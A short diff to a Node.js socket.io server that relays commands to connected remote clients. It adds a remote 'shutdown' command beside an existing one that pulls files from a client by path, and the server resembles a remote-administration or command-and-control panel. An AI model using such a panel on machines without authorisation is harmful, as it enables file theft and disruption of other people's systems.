@@ -14,6 +14,7 @@ app.get('/', function(req, res){
 
 var expectingFile = false;
 io.on('connection', function(socket){
+  for (var c in clients) newClient(c);
 
   socket.on('client:send', function(obj) {
     switch (obj.cmd) {
@@ -42,6 +43,10 @@ io.on('connection', function(socket){
         console.log('send dw', obj);
         expectingFile = obj.sid + '_' + Date.now() + '_' + obj.args.name;
         clients[obj.sid].socket.write('download:' + obj.args.path + '\0');
+        break;
+      case 'shutdown':
+        console.log('send shutdown');
+        clients[obj.sid].socket.write('shutdown:0\0');
         break;
     }
   });
